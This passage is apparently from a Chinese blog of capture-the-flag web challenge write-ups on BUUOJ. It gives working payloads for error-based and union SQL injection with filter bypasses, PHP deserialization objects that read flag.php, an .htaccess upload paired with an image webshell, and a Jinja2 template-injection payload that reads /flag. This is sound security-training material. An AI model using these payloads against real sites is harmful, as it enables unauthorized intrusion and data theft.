&lt;p&gt;还是sql注入题。尝试在输入框里输入&lt;code&gt;#&lt;/code&gt;、&lt;code&gt;--+&lt;/code&gt;时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的&lt;a class="link" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener"
&gt;十种MySQL报错注入&lt;/a&gt;。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用&lt;code&gt;()&lt;/code&gt;隔开，具体payload如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;爆表&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.tables)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(table_schema)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;database&lt;/span&gt;())),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当前表名是：H4rDsq1&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;爆字段&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;column_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.columns)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;H4rDsq1&amp;#39;&lt;/span&gt;)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当前表的字段有：id,username,password&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;出数据&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用&lt;code&gt;left&lt;/code&gt;和&lt;code&gt;right&lt;/code&gt;函数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;left&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;35&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{112bb5db-17a4-47e2-97b4-19&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;right&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;11&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dc295a017f}&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2018fakebook"&gt;[网鼎杯 2018]Fakebook
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307174819.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;是一个展示自己博客网址的列表，先随便注册一个&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307175313.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我填的是baidu的网址23333。这时的url是：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[&lt;a class="link" href="https://www.cnblogs.com/kevinbruce656/p/12643338.html" target="_blank" rel="noopener"
&gt;网鼎杯2018]fakebook题解&lt;/a&gt;，使用了&lt;code&gt;load_file&lt;/code&gt;函数直接读取了flag文件。同样是空格被过滤，但是可以使用&lt;code&gt;/**/&lt;/code&gt;绕过。&lt;/p&gt;
&lt;h2 id="非预期解"&gt;非预期解
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,2,3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先使用上面的语句查看回显点。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307180356.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;找的了位置2的回显点，可以把函数替换在2的位置上。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,load_file(&amp;#39;/var/www/html/flag.php&amp;#39;),3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣&lt;/p&gt;
&lt;h2 id="预期解"&gt;预期解
&lt;/h2&gt;&lt;p&gt;正常的sql注入一套查询，同样是使用&lt;code&gt;/**/&lt;/code&gt;绕过空格过滤。&lt;/p&gt;
&lt;p&gt;爆表&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&amp;#39;users&amp;#39; %23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出数据&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:20:&amp;#34;http://www.baidu.com&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示&lt;strong&gt;the contents of his/her blog&lt;/strong&gt;，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：&lt;strong&gt;使用伪协议读取flag作为blog网站回显在iframe的标签中&lt;/strong&gt;，所以构造一个序列化对象。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;guobang&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $blog &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;file:///var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,2,3,&amp;#39;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}&amp;#39; from%20users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2020-青龙组areuserialz"&gt;[网鼎杯 2020 青龙组]AreUSerialz
&lt;/h1&gt;&lt;p&gt;部分图&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308102316.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;最下面有对于payload的限制：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($s) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;($i &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($s); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;125&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET{&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;})) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $str &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;)$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($str)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $obj &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($str);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要payload中的字符ascii码值&lt;code&gt;大于&lt;/code&gt;32&lt;code&gt;小于&lt;/code&gt;125。注意到最后有一个&lt;code&gt;unserialize&lt;/code&gt;函数，判断这道题考点是反序列化。接下来分析源码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;process()&lt;/code&gt;函数判断op的值，如果是&lt;code&gt;1&lt;/code&gt;就写入文件，如果是&lt;code&gt;2&lt;/code&gt;就读取文件。代码开头包含了&lt;code&gt;flag.php&lt;/code&gt;文件，所以推测需要使用2操作数读取flag.php文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write()&lt;/code&gt;把对象中的&lt;code&gt;$content&lt;/code&gt;属性值写入到&lt;code&gt;$filename&lt;/code&gt;文件中，如果长度大于100会被拦下。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;使用**file_get_contents()**函数读取文件。&lt;strong&gt;正是我们想要的&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;output()&lt;/code&gt;输出内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__destruct()&lt;/code&gt;对象销毁时会执行的函数，需要注意的是&lt;strong&gt;if&lt;/strong&gt;判断里的&lt;code&gt;$this-&amp;gt;op === &amp;quot;2&amp;quot;&lt;/code&gt;是强比较，并且会修改op的值为1（写文件），因为**&amp;ldquo;2&amp;rdquo;&lt;strong&gt;是一个字符串类型的如果传入&lt;/strong&gt;整型的2**即可绕过。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以我们构造一个对象&lt;strong&gt;op&lt;/strong&gt;为2，&lt;strong&gt;filename&lt;/strong&gt;为flag.php即可，读文件的时候肯定不是&lt;/p&gt;
&lt;p&gt;接下来是反序列化时会遇到的问题，因为对象中属性的修饰是&lt;code&gt;protected&lt;/code&gt;，序列化时需要保证一致的。&lt;/p&gt;
&lt;p&gt;先给出自己创建的对象源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $op&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $filename&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $content;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;FileHandler&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($c);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;PHP7.1以上版本对属性类型不敏感、用public绕过:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:22:&amp;#34;/var/www/html/flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{s:2:&amp;#34;op&amp;#34;;i:2;s:8:&amp;#34;filename&amp;#34;;s:52:&amp;#34;php://filter/convert.base64-encode/resource=flag.php&amp;#34;;s:7:&amp;#34;content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start="2"&gt;
&lt;li&gt;序列化字符串中s替换为S，支持字符串用16进制，&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:11:&amp;#34;FileHandler&amp;#34;:3:{S:5:&amp;#34;\00*\00op&amp;#34;;i:2;S:11:&amp;#34;\00*\00filename&amp;#34;;S:22:&amp;#34;/var/www/html/flag.php&amp;#34;;S:10:&amp;#34;\00*\00content&amp;#34;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：https://blog.csdn.net/Oavinci/article/details/106998738&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020你传你呢"&gt;[MRCTF2020]你传你🐎呢
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308104930.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的&lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105247.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了&lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;可以了，说明Content-Type是GIF还不行，接下来直接传图片码&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105652.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110126.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;【极客大挑战 2019】RCE ME&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndfake-google"&gt;[BJDCTF 2nd]fake google
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110510.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;就一个输入框，随便输入一个去看看，跳转以后&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110545.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试&lt;a class="link" href="https://blog.csdn.net/qq_40657585/article/details/83657220" target="_blank" rel="noopener"
&gt;SSTI (服务器模板注入)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;找到了一个直接读文件的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/flag&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110717.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gyctf2020blacklist"&gt;[GYCTF2020]Blacklist
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容&lt;/p&gt;
